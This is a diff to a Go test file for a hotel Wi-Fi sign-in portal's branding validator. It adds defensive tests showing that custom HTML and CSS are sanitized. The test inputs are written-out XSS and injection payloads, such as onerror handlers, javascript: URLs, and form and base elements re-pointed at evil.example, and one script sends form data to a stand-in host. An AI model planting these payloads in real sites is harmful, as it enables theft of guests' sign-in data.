@@ -10,12 +10,31 @@ package main
 // They are deliberately adversarial: each case is a way a real attempt would be spelled, not a single
 // canonical "<script>" that any naive check would catch.
 
-import "testing"
+import (
+	"encoding/json"
+	"net/http"
+	"net/http/httptest"
+	"strings"
+	"testing"
+
+	"github.com/stayconnect/enterprise/data-plane/internal/portaldesign"
+)
 
 func TestBrandingRefusesExecutableContent(t *testing.T) {
 	for _, tc := range []struct{ name, field, value string }{
 		{"a plain script tag", "custom_html", `<script>fetch('//x/'+document.forms[0].room.value)</script>`},
-		{"a script tag with whitespace", "custom_html", "< script >alert(1)</ script >"},
+		// Spellings the old regular-expression denylist let through. Each is refused now because the fragment
+		// is parsed and rebuilt from an allowlist, not because somebody thought of it.
+		{"an onerror handler with no whitespace", "custom_html", `<img/onerror=alert(1) src=x>`},
+		{"a base element re-pointing the forms", "custom_html", `<base href="https://evil.example/">`},
+		{"a button re-targeting the voucher form", "custom_html", `<button form="form-voucher" formaction="https://evil.example/">Go</button>`},
+		{"a meta refresh", "custom_html", `<meta http-equiv="refresh" content="0;url=https://evil.example/">`},
+		{"a stylesheet link", "custom_html", `<link rel="stylesheet" href="https://evil.example/x.css">`},
+		{"a style element in the fragment", "custom_html", `<style>form{display:none}</style>`},
+		{"an entity-encoded javascript URL", "custom_html", `<a href="javascript&#58;alert(1)">Help</a>`},
+		{"an id colliding with the sign-in form", "custom_html", `<div id="form-voucher">x</div>`},
+		{"css url to plain http", "custom_css", `body { background: url(http://evil.example/x.png); }`},
+		{"css escaped expression", "custom_css", `body { width: ex\70ression(alert(1)); }`},
 		{"mixed case", "custom_html", `<ScRiPt>alert(1)</ScRiPt>`},
 		{"an inline handler", "custom_html", `<div onclick="steal()">Welcome</div>`},
 		{"an onerror handler on an image", "custom_html", `<img src=x onerror="fetch('//x')">`},
@@ -160,5 +179,113 @@ func TestThePreviewReadsTheRealPortal(t *testing.T) {
 	// from then on. This pins it to portald's own page rather than to a copy.
 	if portalPreviewURL != "http://127.0.0.1:8380/" {
 		t.Errorf("the preview source is %q; it must be the portal's own sign-in page on this appliance", portalPreviewURL)
+	}
+}
+
+// "< script >" IS TEXT TO A BROWSER, and it used to be refused as if it were a tag. What matters is what the
+// guest's browser would do with it, so the assertion is now the stronger one: it reaches the page only as
+// escaped text, never as markup.
+func TestTextThatLooksLikeATagReachesTheGuestAsText(t *testing.T) {
+	g := portaldesign.ForGuests(map[string]any{"custom_html": "< script >alert(1)</ script >"})
+	h, _ := g["custom_html"].(string)
+	if strings.Contains(h, "<script") || strings.Contains(h, "< script") {
+		t.Fatalf("text that looked like a tag was served as markup: %q", h)
+	}
+}
+
+func TestTermsURLIsValidated(t *testing.T) {
+	// It became a live link on the sign-in page without any check at all.
+	for _, bad := range []string{"javascript:alert(1)", "http://hotel.example/terms", "//evil.example/terms"} {
+		if err := validateDesign(map[string]any{"terms_url": bad}); err == nil {
+			t.Errorf("terms_url %q was accepted", bad)
+		}
+	}
+	if err := validateDesign(map[string]any{"terms_url": "https://hotel.example/terms"}); err != nil {
+		t.Errorf("an https terms link was refused: %v", err)
+	}
+}
+
+func TestTextAndTemplateFieldsAreBounded(t *testing.T) {
+	for _, bad := range []map[string]any{
+		{"welcome_text": strings.Repeat("a", portaldesign.MaxWelcomeText+1)},
+		{"help_text": strings.Repeat("a", portaldesign.MaxHelpText+1)},
+		{"template_id": "not-a-template"},
+		{"template_options": map[string]any{"panel_position": "sideways"}},
+		{"translations": map[string]any{"it": map[string]any{"pms.room": strings.Repeat("x", portaldesign.MaxTranslationText+1)}}},
+	} {
+		if err := validateDesign(bad); err == nil {
+			t.Errorf("%v was accepted", bad)
+		}
+	}
+	for _, tp := range portaldesign.Templates {
+		if err := validateDesign(map[string]any{"template_id": tp.ID}); err != nil {
+			t.Errorf("template %s refused: %v", tp.ID, err)
+		}
+	}
+}
+
+// CHOOSING A TEMPLATE IS NOT ADVANCED. Ordinary branding saves with no password; custom CSS and HTML need it in
+// both directions. Template choice and its options are closed vocabularies, so they must not trip it.
+func TestTemplateChoiceDoesNotTriggerTheStepUp(t *testing.T) {
+	current := map[string]any{"hotel_name": "Coral Sea", "custom_css": ".a{}"}
+	next := map[string]any{"hotel_name": "Coral Sea", "custom_css": ".a{}", "template_id": "split",
+		"template_options": map[string]any{"overlay": 30}, "hero_image_url": "/assets/h.jpg"}
+	if advancedChanged(next, current) {
+		t.Error("choosing a template asked for the password")
+	}
+	for _, k := range portaldesign.AdvancedFields {
+		n := map[string]any{"hotel_name": "Coral Sea", "custom_css": ".a{}"}
+		n[k] = "changed"
+		if !advancedChanged(n, current) {
+			t.Errorf("changing %s did not ask for the password", k)
+		}
+	}
+}
+
+func TestBrandingBodiesAreCapped(t *testing.T) {
+	s := &server{}
+	h := s.brandingRoutes()
+	big := `{"design":{"custom_css":"` + strings.Repeat("a", portaldesign.MaxBodyBytes+10) + `"}}`
+	w := httptest.NewRecorder()
+	h.ServeHTTP(w, httptest.NewRequest(http.MethodPost, "/validate", strings.NewReader(big)))
+	if w.Code != http.StatusRequestEntityTooLarge {
+		t.Fatalf("an oversized body answered %d, want 413", w.Code)
+	}
+}
+
+func TestValidateEndpointNamesWhatWouldBeRemoved(t *testing.T) {
+	s := &server{}
+	h := s.brandingRoutes()
+	body := `{"design":{"custom_html":"<p>Pool</p><img src=x onerror=alert(1)>","custom_css":"form{display:none!important}"}}`
+	w := httptest.NewRecorder()
+	h.ServeHTTP(w, httptest.NewRequest(http.MethodPost, "/validate", strings.NewReader(body)))
+	if w.Code != http.StatusOK {
+		t.Fatalf("status %d: %s", w.Code, w.Body.String())
+	}
+	var got struct {
+		OK     bool                 `json:"ok"`
+		Issues []portaldesign.Issue `json:"issues"`
+		San    map[string]string    `json:"sanitized"`
+	}
+	if err := json.Unmarshal(w.Body.Bytes(), &got); err != nil {
+		t.Fatal(err)
+	}
+	if got.OK {
+		t.Error("a design with an onerror handler was reported ok")
+	}
+	var sawHandler, sawImportant bool
+	for _, i := range got.Issues {
+		if i.Field == "custom_html" && strings.Contains(i.Message, "onerror") && i.Severity == portaldesign.SeverityError {
+			sawHandler = true
+		}
+		if i.Field == "custom_css" && strings.Contains(i.Message, "!important") && i.Severity == portaldesign.SeverityWarning {
+			sawImportant = true
+		}
+	}
+	if !sawHandler || !sawImportant {
+		t.Errorf("issues do not name what would change: %+v", got.Issues)
+	}
+	if strings.Contains(got.San["custom_html"], "onerror") || !strings.Contains(got.San["custom_html"], "<p>Pool</p>") {
+		t.Errorf("sanitised preview is wrong: %q", got.San["custom_html"])
 	}
 }
